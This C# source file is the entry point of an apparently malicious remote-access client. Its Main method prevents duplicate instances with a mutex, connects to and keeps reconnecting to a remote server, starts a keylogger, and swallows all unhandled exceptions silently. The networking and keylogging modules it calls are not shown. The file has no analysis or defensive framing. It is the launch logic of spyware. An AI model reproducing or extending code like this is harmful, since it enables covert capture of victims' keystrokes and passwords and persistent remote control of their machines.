using Client.Config;
using Client.Core.Events;
using Client.Core.Helper;
using Client.Core.Keylogging;
using Client.Core.Networking;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Client
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        /// 
        [STAThread]
        static void Main()
        {
            if (MutexHelper.CreateMutex(Settings.MUTEX))
            {
                //ENTRY
                NetworkManager.Connect();
                NetworkManager.StartReconnect();
                Keylogger.Start();
                AppDomain.CurrentDomain.UnhandledException += UnhandledExceptionTrapper;
            }
            else
            {
                //Mulitple instances!
                if (System.Windows.Forms.Application.MessageLoop)
                {
                    // WinForms app
                    System.Windows.Forms.Application.Exit();
                }
                else
                {
                    // Console app
                    System.Environment.Exit(1);
                }
            }
        }

        static void UnhandledExceptionTrapper(object sender, UnhandledExceptionEventArgs e)
        {
            //ERROR
        }
    }
}
